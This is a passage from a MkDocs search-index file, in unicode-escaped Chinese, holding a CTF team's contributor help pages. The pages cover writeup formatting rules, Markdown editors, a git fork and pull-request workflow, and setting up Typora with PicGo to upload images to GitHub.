\u7528\u6237\u540d\u8fdb\u884c\u81ea\u52a8\u7f72\u540d\u3002</p> </li> <li> <p>\u6ce8\u610f md \u6587\u4ef6\u5e76\u4e0d\u5185\u5d4c\u56fe\u7247\uff0c\u56e0\u6b64\u56fe\u7247\u94fe\u63a5\u63a8\u8350\u4f7f\u7528\u7f51\u7edc\u56fe\u7247\u6216\u5c06\u672c\u5730\u56fe\u7247\u4e0a\u4f20\u81f3\u56fe\u5e8a\uff08\u8bb0\u5f97\u8131\u654f\uff01\uff01\uff01\uff09\uff0c\u4e0a\u4f20\u81f3\u56fe\u5e8a\u8fc7\u7a0b\u53ef\u53c2\u8003\u6587\u6863 \u672c\u5730\u56fe\u7247\u4e0a\u4f20</p> </li> <li> <p>\u9759\u6001\u7f51\u7ad9\u7684\u6807\u9898\u9ed8\u8ba4\u4e3a md \u6587\u4ef6\u540d\uff0c\u6587\u4ef6\u540d\u9700\u8981\u4e3a\u9898\u76ee\u540d\u79f0\uff08\u53c2\u8003\u5df2\u4e0a\u4f20 wp\uff09\uff0cwp \u4e2d\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\u4e00\u7ea7\u6807\u9898\uff0c\u4f1a\u8986\u76d6\u9759\u6001\u7f51\u7ad9\u9ed8\u8ba4\u6807\u9898</p> </li> <li> <p>\u6dfb\u52a0\u7684 md \u6587\u4ef6\u9700\u8981\u653e\u5728docs\u76ee\u5f55\u4e0b\u7684\u5bf9\u5e94\u5206\u7c7b\u4e2d</p> </li> <li> <p>\u63d0\u4ea4 pr \u524d\u53ef\u5728\u4ed3\u5e93\u4e0b\u4f7f\u7528 <code>mkdocs serve</code> \u6307\u4ee4\u9884\u89c8\u7f51\u9875\u6548\u679c\uff0c\u51fa\u73b0\u62a5\u9519\u53ef\u590d\u5236\u8be2\u95ee LLM \u6d4b\u8bd5</p> </li> </ol>"},{"location":"%E5%B8%AE%E5%8A%A9/Writeup%E7%BC%96%E5%86%99%E8%A7%84%E8%8C%83/#md","title":"\u63a8\u8350\u7684 md \u7f16\u8f91\u5668","text":"<ul> <li> <p>Typora\uff08\u53ef\u81ea\u884c\u641c\u7d22\u514d\u8d39\u7248\u6559\u7a0b\uff09</p> </li> <li> <p>Obsidian \uff08\u6ce8\u610f\u5176\u72ec\u6709\u7684\u56fe\u7247\u94fe\u63a5\u683c\u5f0f\uff09</p> </li> <li>VsCode + markdown \u63d2\u4ef6</li> </ul>"},{"location":"%E5%B8%AE%E5%8A%A9/git%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/","title":"Git\u591a\u4eba\u534f\u4f5c","text":"<p>Git\u662f\u4e00\u4e2a\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u5b83\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u8ddf\u8e2a\u548c\u7ba1\u7406\u4ee3\u7801\u7684\u5386\u53f2\u53d8\u66f4\u3002\u800cGitHub\u5219\u662f\u4e00\u4e2a\u5728\u7ebf\u5e73\u53f0\uff0c\u5b83\u4f7f\u7528Git\u4f5c\u4e3a\u7248\u672c\u63a7\u5236\u5de5\u5177\uff0c\u5141\u8bb8\u5f00\u53d1\u8005\u5b58\u50a8\u3001\u5171\u4eab\u548c\u534f\u4f5c\u4ee3\u7801\u9879\u76ee\u3002</p>"},{"location":"%E5%B8%AE%E5%8A%A9/git%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/#_1","title":"\u57fa\u672c\u64cd\u4f5c","text":"<p>\u9996\u5148\u672c\u5730\u6ca1\u6709\u4ed3\u5e93\uff0c\u628a\u8fdc\u7a0b\u4ed3\u5e93\u5b8c\u6574\u5730 \u514b\u9686\uff08clone\uff09 \u5230\u672c\u5730 <pre><code>git clone https://github.com/CTF-USTB/Panic404-wp.git\n</code></pre></p> <p>\u8fd9\u4e2a\u65f6\u5019\u5c31\u53ef\u4ee5\u5bf9\u672c\u5730\u4ed3\u5e93\u4e2d\u7684\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\u4e86\uff0c\u6b64\u65f6\u4f60\u5904\u4e8egit\u7684\u5de5\u4f5c\u533a \u4fee\u6539\u5b8c\u540e\u9700\u8981 \u6dfb\u52a0\uff08add\uff09 \u6587\u4ef6\u5230\u6682\u5b58\u533a <pre><code># .\u8868\u793a\u5de5\u4f5c\u533a\u4e2d\u6240\u6709\u4fee\u6539\u7684\u6587\u4ef6\ngit add .\n</code></pre></p> <p>\u53ef\u4ee5\u591a\u6b21\u4fee\u6539\u591a\u6b21\u6dfb\u52a0\uff0c\u5f53\u6240\u6709\u6539\u52a8\u90fd\u52a0\u5165\u6682\u5b58\u533a\u540e\uff0c\u9700\u8981 \u63d0\u4ea4\uff08commit\uff09 \u5230\u672c\u5730\u4ed3\u5e93 <pre><code># \"description\" \u5b57\u7b26\u4e32\u4e3a\u8fd9\u6b21\u63d0\u4ea4\u7684\u63cf\u8ff0\ngit commit -m \"description\"\n</code></pre></p> <p>\u7136\u540e\u53ef\u4ee5\u5c06\u63d0\u4ea4 \u63a8\u9001\uff08push\uff09 \u5230github\u4e91\u7aef\u4ed3\u5e93 <pre><code># \u9ed8\u8ba4\u63a8\u9001\u5f53\u524d\u5206\u652f\ngit push\n# \u7136\u540e\u4f1a\u8ba9\u4f60\u9a8c\u8bc1\u4f60\u7684\u8d26\u6237\u8eab\u4efd\n</code></pre></p> <p>\u540e\u7eed\u5728\u672c\u5730\u83b7\u53d6\u4e91\u7aef\u6700\u65b0\u4ed3\u5e93\u9700\u8981 \u62c9\u53d6\uff08pull\uff09 <pre><code># origin \u4e3a\u4e00\u4e2a\u9ed8\u8ba4\u53d8\u91cf\uff0c\u5b58\u50a8\u4e91\u7aef\u4ed3\u5e93\u5730\u5740\n# main \u4e3a\u4e3b\u5206\u652f\u540d\ngit pull origin main\n</code></pre></p> <p>\u62c9\u53d6\u5b8c\u6bd5\u540e\u53ef\u4ee5\u63a5\u7740\u5728\u672c\u5730\u4ed3\u5e93\u7f16\u8f91</p>"},{"location":"%E5%B8%AE%E5%8A%A9/git%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/#fork-pull-request","title":"Fork &amp; Pull request","text":"<p>Github\u5e73\u53f0\u63d0\u4f9b\u7684\u534f\u4f5c\u673a\u5236</p> <p>\u5f53\u4f60\u6ca1\u6709\u5bf9\u8fdc\u7a0b\u4ed3\u5e93\u7684\u5199\u5165\u6743\u9650\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 Fork\uff0c\u5728\u4f60\u8d26\u6237\u4e0b\u590d\u5236\u4e00\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u751f\u6210\u72ec\u7acb\u4ed3\u5e93\uff0c\u7136\u540e\u4f60\u53ef\u4ee5\u5bf9\u81ea\u5df1\u8d26\u6237\u4e0b\u7684\u8fd9\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u8fdb\u884c\u4e0a\u8ff0\u7684\u57fa\u672c\u64cd\u4f5c</p> <p></p> <p>Fork\u5b8c\u6210\u540e\u9996\u5148 clone <pre><code># fork\u65f6\u9ed8\u8ba4\u4ed3\u5e93\u540d\u4e3aPanic404-wp\ngit clone https://github.com/\u4f60\u7684\u7528\u6237\u540d/Panic404-wp.git\ncd Panic404-wp\n</code></pre></p> <p>\u7136\u540e\u6dfb\u52a0\u539f\u59cb\u4ed3\u5e93\u4e3a upstream <pre><code>git remote add upstream https://github.com/CTF-USTB/Panic404-wp.git\n</code></pre></p> <p>\u540c\u6b65\u539f\u59cb\u4ed3\u5e93\u6700\u65b0\u63d0\u4ea4 <pre><code>git fetch upstream\ngit checkout main\ngit merge upstream/main\n</code></pre></p> <p>\u7136\u540e\u4e3a\u4e86\u4e0d\u6c61\u67d3main\u5206\u652f\uff0c\u4e00\u822c\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\u7528\u4e8e\u7f16\u8f91\u5f00\u53d1 <pre><code># git checkout \u53ef\u4ee5\u5207\u6362\u5230\u5bf9\u5e94\u5206\u652f\n# git branch \u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5206\u652f\n# git checkout -b \u4e3a\u521b\u5efa\u5e76\u5207\u6362\u5230\u8be5\u5206\u652f\n# [username] \u4e3a\u4f60\u7684Github\u7528\u6237\u540d\uff0c\u4fbf\u4e8e\u6211\u4eec\u7ba1\u7406\ngit checkout -b [username]-wp\n</code></pre></p> <p>\u7136\u540e\u5c06\u6240\u6709\u6539\u52a8\u5728\u8fd9\u4e2a\u5206\u652f\u4e0a\u63d0\u4ea4\uff0c\u5e76\u63a8\u9001\u8be5\u5206\u652f\u5230\u81ea\u5df1\u7684\u8fdc\u7a0b\u4ed3\u5e93 <pre><code># \u7f16\u8f91\u3001\u63d0\u4ea4\ngit add .\ngit commit -m \"Add my writeup\"\n\n# \u63a8\u9001\u5230\u81ea\u5df1\u7684 Fork\ngit push origin [username]-wp\n</code></pre></p> <p>\u6700\u540e\u5728Github\u4e0a\u7684\u8be5Fork\u4ed3\u5e93\u4e2d\u63d0\u4ea4 Pull request\uff08PR\uff09\uff0c\u8bf7\u6c42\u539f\u4ed3\u5e93\u7684\u5ba1\u6838\u8005 pull \u4f60\u7684\u5206\u652f\uff0c\u7136\u540e\u7b49\u5f85\u5ba1\u6838\u6216\u4fee\u6539\u610f\u89c1</p>"},{"location":"%E5%B8%AE%E5%8A%A9/git%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/#pr","title":"\u540e\u7eed\u63d0\u4ea4PR\u7684\u4e00\u822c\u6d41\u7a0b","text":"<p>\u8fdb\u5165\u672c\u5730\u4ed3\u5e93\uff08\u6b64\u65f6\u4f4d\u4e8e\u4e4b\u524d\u65b0\u5efa\u7684\u5206\u652f\u4e0a\uff09\uff0c\u62c9\u53d6\u4e0a\u6e38\u4ed3\u5e93\u66f4\u65b0\u672c\u5730fork\u4ed3\u5e93\uff08\u786e\u4fddupstream\u5730\u5740\u5728\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u914d\u7f6e\u5b8c\u6210\uff09</p> <pre><code>git pull --rebase upstream main\n</code></pre> <p>\u6dfb\u52a0\u3001\u63d0\u4ea4\u7f16\u8f91\u597d\u7684wp</p> <pre><code>git add .\ngit commit -m \"Add my writeup\"\n</code></pre> <p>\u5c06\u5206\u652f\u63a8\u9001\u5230\u81ea\u5df1\u7684 Fork\u4ed3\u5e93</p> <pre><code>git push --force-with-lease origin [username]-wp\n</code></pre> <p>\u767b\u5165Github\u5bf9\u5e94Fork\u4ed3\u5e93\u63d0\u4ea4PR\uff0c\u7b49\u5f85\u5ba1\u6838\u6216\u4fee\u6539\u610f\u89c1</p>"},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/","title":"\u672c\u5730\u56fe\u7247\u4e0a\u4f20","text":"<p>\u63a8\u8350\u4f7f\u7528 Typora+ PicGo \u4e0a\u4f20\u672c\u5730\u56fe\u7247\u5230  Github\u4ed3\u5e93</p>"},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/#_1","title":"\u914d\u7f6e","text":""},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/#typora","title":"Typora \u504f\u597d\u8bbe\u7f6e","text":"<p>\u6587\u4ef6 -&gt; \u504f\u597d\u8bbe\u7f6e -&gt; \u56fe\u7247</p> <p>\u504f\u597d\u8bbe\u7f6e\u53c2\u8003\u5982\u4e0b\uff0c\u63d2\u5165\u56fe\u7247\u65f6\u4fdd\u6301\u9ed8\u8ba4\u9009\u9879 <code>\u65e0\u7279\u6b8a\u64cd\u4f5c</code>\uff0c\u5728\u6700\u540ewriteup\u64b0\u5199\u5b8c\u6210\u540e\u7edf\u4e00\u4e0a\u4f20\u56fe\u7247\uff0c\u5c3d\u91cf\u4fdd\u8bc1\u56fe\u7247\u4ed3\u5e93\u7684\u6574\u6d01\u3002</p> <p></p> <p>\u91cd\u70b9\u5173\u6ce8\u56fe\u7247\u4e0a\u4f20\u670d\u52a1\u8bbe\u7f6e\uff0c\u9009\u62e9 <code>PicGo(app)</code> \u670d\u52a1\uff0c\u70b9\u51fb\u4e0b\u8f7d\u540e\u5b89\u88c5\u5230\u4efb\u610f\u6587\u4ef6\u5939\u4e0b\uff0c\u914d\u7f6e\u597d PicGo\u8def\u5f84\u9009\u9879</p>"},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/#picgo-app","title":"\u914d\u7f6e PicGo (app)","text":"<p>\u8fdb\u5165Gtihub\u56fe\u5e8a\u914d\u7f6e</p> <p></p> <p>\u914d\u7f6e\u5982\u56fe\uff0ctoken\u8bf7\u5173\u6ce8\u5185\u90e8\u6d88\u606f</p> <pre><code># \u590d\u5236\u81f3\u5bf9\u5e94\u4f4d\u7f6e\nPanic404-wp-images\nCTF-USTB/Panic404-wp-images\nmain\n* # \u66ff\u6362\u4e3a\u771f\u5b9etoken\nimages/\nhttps://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images\n</code></pre> <p></p> <p>\u70b9\u51fb\u786e\u5b9a\u540e\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u56fe\u5e8a</p> <p>\u7136\u540e\u4fee\u6539PicGo\u8bbe\u7f6e\uff0c\u5f00\u542f <code>\u65f6\u95f4\u6233\u91cd\u547d\u540d</code> \u9009\u9879</p> <p></p>"},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/#_2","title":"\u6d4b\u8bd5\u56fe\u7247\u4e0a\u4f20","text":"<p>\u56de\u5230Typora\uff0c\u6587\u4ef6 -&gt; \u504f\u597d\u8bbe\u7f6e -&gt; \u56fe\u7247</p> <p>\u70b9\u51fb\u4e0a\u4f20\u670d\u52a1\u8bbe\u5b9a\u4e2d\u7684 <code>\u9a8c\u8bc1\u56fe\u7247\u4e0a\u4f20\u9009\u9879</code>\uff0c\u6ce8\u610f\u8981\u5173\u95ed Watt Toolkit (steam++)\uff0c\u5426\u5219\u4f1a\u56e0\u4e3a\u7f51\u7edc\u95ee\u9898\u4e0a\u4f20\u5931\u8d25</p> <p></p>"},{"location":"%E5%B8%AE%E5%8A%A9/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/#_3","title":"\u4f7f\u7528","text":"<p>\u4f7f\u7528Typora\u7f16\u5199\u5b8cWriteup\u540e\uff0c\u70b9\u51fb \u683c\u5f0f -&gt; \u56fe\u50cf -&gt; \u4e0a\u4f20\u6240\u6709\u672c\u5730\u56fe\u7247</p> <p>\u8fd9\u4f1a\u5c06\u4f60\u672c\u7bc7md\u6587\u4ef6\u5f15\u7528\u7684\u6240\u6709\u672c\u5730\u56fe\u7247\u90fd\u4e0a\u4f20\u81f3\u56fe\u5e8a</p> <p></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5c06\u5355\u72ec\u7684md\u6587\u4ef6\u4e0a\u4f20\u81f3Writeup\u4ed3\u5e93\uff0c\u800c\u4e0d\u7528\u518d\u4e0a\u4f20\u56fe\u7247\u4e86</p>"}]}